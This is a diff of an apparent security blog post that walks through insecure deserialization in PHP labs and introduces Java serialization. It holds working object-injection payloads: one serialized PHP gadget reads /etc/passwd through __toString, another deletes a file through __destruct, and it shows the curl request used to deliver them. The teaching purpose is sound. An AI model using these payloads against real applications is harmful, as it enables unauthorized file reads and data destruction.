@@ -6,8 +6,6 @@ categories: [Web Pentesting, Deserialization]
 tags: [Web Pentesting, Deserialization]
 ---
 
-# Deserializing-the-Deserialization-Attacks
-
 I was solving one of the active box in HTB where I encountered some interesting Deserialization vulnerability. Although I managed to solve the box, I was more curious about the exploitation of deserialization vulnerability in different languages. Therefore this blog contains the walkthrough for deserialization attacks on Java, PHP, Python and Node.
 
 The walkthrough is based on the lab https://github.com/NotSoSecure/NotSoCereal-Lab
@@ -214,77 +212,7 @@ curl -XPOST -d 'ippsec=O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N
 ```
 ![image](https://user-images.githubusercontent.com/47778874/226165231-1c52b9f2-a381-4bd7-9d4b-e607b8780499.png)
 
-Here we can see that the user can serialize the data and the application will proceed data submitted by a user. There is a possible chance that this code is vulnerable to insecure deserialization. But we can not just exploit it right away since there is no any dangerous functions implemented on here.
-
-But suppose the application also contains a class to read the file content from the provided filename. To do such, it can have some magic methods availble like **__tostring()**. You can learn more magic functions in PHP [here](https://www.php.net/manual/en/language.oop5.magic.php). This makes our server.php code as below:
-```php
-<?php
-class ReadFile
-{
-      public function __tostring()
-      {
-          return file_get_contents($this->filename);
-      }
-}
-class User
-{
-    public $username;
-    public $isAdmin;
-
-    public function PrintData(){
-        if ($this->isAdmin){
-            echo $this->username . " is an admin\n";
-        }else{
-          echo $this->username . " is not an admin\n";
-        }
-    }
-}
-$obj = unserialize($_POST['ippsec']);
-$obj->PrintData();
-?>
-```
-So using the deserialization vulnerability, we can jump into the **__tostring()** method of ReadFile class ince it is defined there. Let's create our client.php file now.
-```php
-<?php
-
-class ReadFile{
-    public function __construct()
-    {
-        $this->filename = '/etc/passwd';
-    }
-}
-class User
-{
-    public function __construct()
-    {
-        $this->username = new ReadFile();
-        $this->isAdmin = True;
-    }
-}
-$obj = new User();
-echo serialize($obj);
-?>
-```
-**So, what does this code actually do?**<br>
-The code has two classes ReadFile and User. The ReadFile file class sets `/etc/passwd` on a variable filename under **__construct()** method which is a constructor. The User object is reconstructed and the **__construct()** method of the ReadFile class is called, which sets the filename property to `/etc/passwd`. This means that the ReadFile object assigned to the username property now contains a reference to the /etc/passwd file.
-
-So, when we serialize the above code, it contains information about the "User" object and its properties, including the "ReadFile" object assigned to the "username" property. As a result, when the serialized object is tranmitted on the server.php file, it deserializes it and the object is injected, which means since ReadFile class is defined on the server.php file due to the **__tostring()** method the ReadFile class will be triggerred and `/etc/passwd` file will be passed on the parameter `filename` which will return the content of the file.
-
-Create a malicious serialized object with above code.
-```bash
-bash client.php
-
-O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}
-```
-
-Now again host the server.php and execute the payload.
-```bash
-php -S 127.0.0.1:80
-
-curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}' 127.0.0.1/server.php
-```
-
-![image](https://user-images.githubusercontent.com/47778874/226169753-325de553-5a63-4582-861d-185de72f8f4b.png)
+Here we can see that the user can serialize the data and the application will proceed data submitted by a user. There is a possible chance that this code is vulnerable to insecure deserialization. But we can not just exploit it right away since there is no any dangerous functions implemented on here. We will learn more on **Arbitrary objects and Magic Methods** on below Lab Demonstrations sections.
 
 ## Lab Demonstration
 Let's move to the practical lab walkthrough now. Yes, we are yet to start the practical lab.
@@ -540,5 +468,173 @@ Magic methods generally does not contains vulnerabilities on it's own, but if th
    - It will be called as soon as a serialized object of the class is deserialized.
 - **__toString()**
    - It will be called when an object of a class is treated as a string. Example, if `echo $obj` is performed, the `__toString()` method is called automatically.<br>
-
 You can learn more about [PHP Magic Methods here.](https://www.geeksforgeeks.org/what-are-magic-methods-and-how-to-use-them-in-php/)
+
+Suppose the application also contains a class to read the file content from the provided filename. To do such, it can have some magic methods availble like **__tostring()**.This makes our server.php code as below:
+```php
+<?php
+class ReadFile
+{
+      public function __tostring()
+      {
+          return file_get_contents($this->filename);
+      }
+}
+class User
+{
+    public $username;
+    public $isAdmin;
+
+    public function PrintData(){
+        if ($this->isAdmin){
+            echo $this->username . " is an admin\n";
+        }else{
+          echo $this->username . " is not an admin\n";
+        }
+    }
+}
+$obj = unserialize($_POST['ippsec']);
+$obj->PrintData();
+?>
+```
+So using the deserialization vulnerability, we can jump into the **__tostring()** method of ReadFile class since it is defined there. Let's create our client.php file now.
+```php
+<?php
+
+class ReadFile{
+    public function __construct()
+    {
+        $this->filename = '/etc/passwd';
+    }
+}
+class User
+{
+    public function __construct()
+    {
+        $this->username = new ReadFile();
+        $this->isAdmin = True;
+    }
+}
+$obj = new User();
+echo serialize($obj);
+?>
+```
+**So, what does this code actually do?**<br>
+The code has two classes ReadFile and User. The ReadFile file class sets `/etc/passwd` on a variable filename under **__construct()** method which is a constructor. The User object is reconstructed and the **__construct()** method of the ReadFile class is called, which sets the filename property to **/etc/passwd**. This means that the ReadFile object assigned to the username property now contains a reference to the **/etc/passwd** file.
+
+So, when we serialize the above code, it contains information about the "User" object and its properties, including the "ReadFile" object assigned to the "username" property. As a result, when the serialized object is tranmitted on the server.php file, it deserializes it and the object is injected, which means since ReadFile class is defined on the server.php file due to the **__tostring()** method the ReadFile class will be triggerred and `/etc/passwd` file will be passed on the parameter **filename** which will return the content of the file.
+
+Create a malicious serialized object with above code.
+```bash
+bash client.php
+
+O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}
+```
+
+Now again host the server.php and execute the payload.
+```bash
+php -S 127.0.0.1:80
+
+curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}' 127.0.0.1/server.php
+```
+![image](https://user-images.githubusercontent.com/47778874/226169753-325de553-5a63-4582-861d-185de72f8f4b.png)
+
+Let's explore this on [PortSwigger Lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php) as well.
+
+![image](https://user-images.githubusercontent.com/47778874/227760270-2b320ccb-4338-402f-a947-0f4da3d8638b.png)
+- The goal is to delete a text file called **morale.txt** from Carlo's home directory. Also we need to view the source code to solve this lab.
+- Navigate to My Account section, enter provided login details `wiener:peter`.
+- View the source code of the application with `Ctrl+U`. We can see a commented section where contains `/libs/CustomTemplate.php`
+- Since we need to read the source code inorder to exploit the vulnerability in this lab, this PHP file might contain some useful information.
+- Open it on the repeater. The response does not contain any code.
+![image](https://user-images.githubusercontent.com/47778874/227761091-9a7dd2b7-d5f2-498f-8042-50dc7da73eb3.png)
+- Append `~` on the file and send the request again.
+![image](https://user-images.githubusercontent.com/47778874/227761124-775196c7-d001-464b-9707-afb54d004c5f.png)
+- We can find the source code, let's download the source code and analyze it to find the vulnerability.
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+?>
+```
+- In the above code, we can see that it contains a **__destruct()** method which will be triggered at the end of execution on this PHP file. The **__destruct()** method will check whether the file exists on the system and using the **unlink()** method it will delete the file if it exist. The **unlink()** method on the PHP is used to delete the file.
+- Let's create an exploit for this
+```php
+<?php
+
+class CustomTemplate
+{
+    public function __construct()
+    {
+        $this->lock_file_path = '/home/carlos/morale.txt';
+    }
+}
+$obj = new CustomTemplate();
+echo serialize($obj);
+?>
+```
+- Here the code contains a **CustomTemplate** class which has **__construct()** method and it will be executed every time the class CustomTemplate is instantiated. The construct method is used to initalize the property to the string parameter called **lock_file_path** and prints its serialized object.
+- So in the server side, when the object is unserialized, the **__destruct()** method will be triggered and check for the existence of file passed on **lock_file_path** parameter and if it exist, it will delete the file.
+- Run the code to create a serialized object.
+```bash
+bash exploit.php
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+- Encode it with Base64 encoder and replace it to the session cookie.
+![image](https://user-images.githubusercontent.com/47778874/227762135-3fe689bb-10cf-4a70-bca3-6c8b0a1b4d00.png)
+![image](https://user-images.githubusercontent.com/47778874/227762222-46fee191-33bf-4b8e-895c-03200cdf414b.png)
+- The file will be deleted and the lab will be solved.
+![image](https://user-images.githubusercontent.com/47778874/227762210-07492b3c-18b3-45d4-910f-1fe6f642dedb.png)
+
+### Deserialization on Java
+Serialization is performed under java in **java.io** package which includes
+- **java.io.serializable**
+- **java.io.Externalizable**
+- **ObjectInputStream**
+- **ObjectOutputStream**
+
+**ObjectOutputStream Class**
+- It is used to write object states to the file. An object that implements **java.io.Serializable** interface can be written to strams. It provides various methods to perform serialization.
+- The **writeObject()** method of **ObjectOutputStream** class serializes an object and send it to the output stream
+```java
+public final void writeObject(object x) throws IOException
+```
+
+**ObjectInputStream Class**
+- An ObjectInputStream deserializes objects and primitive data written using an ObjectOutputStream.
+- The **readObject()** method of **ObjectInputStream** class references object out of stream and deserialize it.
+```java
+public final Object readObject() throws IOException,ClassNotFoundException
+```
+You can learn about [Java Serialization and Deserialization more here.](https://www.studytonight.com/java/serialization-and-deserialization.php)
+
